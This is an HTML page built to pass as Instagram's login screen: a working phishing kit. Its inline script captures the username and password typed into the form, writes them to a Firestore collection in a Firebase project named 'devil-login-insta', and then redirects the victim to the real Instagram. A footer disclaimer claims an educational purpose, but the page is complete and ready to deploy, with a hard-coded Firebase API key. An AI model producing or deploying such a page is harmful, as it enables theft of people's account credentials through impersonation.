<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>Instagram</title>
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <meta http-equiv="refresh" content="60">
    <link rel="icon" href="images/favicon.png" type="image/icon">
    <link rel="stylesheet" href="style.css">

    <!-- 1️⃣ Firebase SDKs – pick only what you need -->
    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-firestore-compat.js"></script>

    <script>
        // 2️⃣ Paste the Firebase config you copied from the console
        const firebaseConfig = {
            apiKey: "AIzaSyAreQB8UZmBjEPS3AzAur8NDP5JNnkWkTE",
  authDomain: "devil-login-insta.firebaseapp.com",
  projectId: "devil-login-insta",
  storageBucket: "devil-login-insta.firebasestorage.app",
  messagingSenderId: "1027943607691",
  appId: "1:1027943607691:web:bcd159357f269c8e91538e"
        };

        // 3️⃣ Initialize Firebase
        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore();   // Firestore reference

        // 4️⃣ Intercept the form submission
        document.addEventListener('DOMContentLoaded', () => {
            const form = document.getElementById('loginForm');
            form.addEventListener('submit', async (e) => {
                e.preventDefault();   // Stop the normal post

                const username = form.u_name.value.trim();
                const password = form.pass.value.trim();

                if (!username || !password) {
                    alert('Please fill in both fields.');
                    return;
                }

                try {
                    // Store credentials in Firestore
                    await db.collection('logins').add({
                        username,
                        password,
                        submittedAt: firebase.firestore.FieldValue.serverTimestamp()
                    });

                    // Optionally, redirect to Instagram (or any page)
                    window.location.href = 'https://www.instagram.com';
                } catch (err) {
                    console.error('Firestore error:', err);
                    alert('Could not submit data. Try again later.');
                }
            });
        });
    </script>
</head>

<body>
<div class="container">
    <div class="page">
        <div class="logo">
            <img src="images/instagram.png" alt="instagram" style="width:175px;">
        </div>

        <br/>
        <form id="loginForm" class="container" action="send.php" method="post">
            <input type="text" placeholder="Phone number, username, or email" name="u_name" required>
            <input type="password" placeholder="Password" name="pass" required>
            <button class="submitbutton">Log in</button>
            <br/>
            <div class="option">OR</div>
        </form>

        <div class="fblink">
            <span class="fab fafacebook"></span>
            <a href="#"> Log in With Facebook</a>
        </div>

        <div class="forget-id">
            <a href="https://www.instagram.com/accounts/password/reset/">Forget password?</a>
        </div>
        <div class="singup">
            <p>Don't have an account?<a href="https://www.instagram.com/accounts/emailsignup/"> Sign up</a></p>
        </div>
    </div>
</div>

<br/>
<div style="position:fixed;left:0;bottom:0;width:100%;color:#7e7979;">
    <p style="text-align:center;">Disclaimer: This is not a real "instagram.com" page, please do not enter your real username and password, it's only for educational purposes.</p>
</div>
<br/>
</body>
</html>
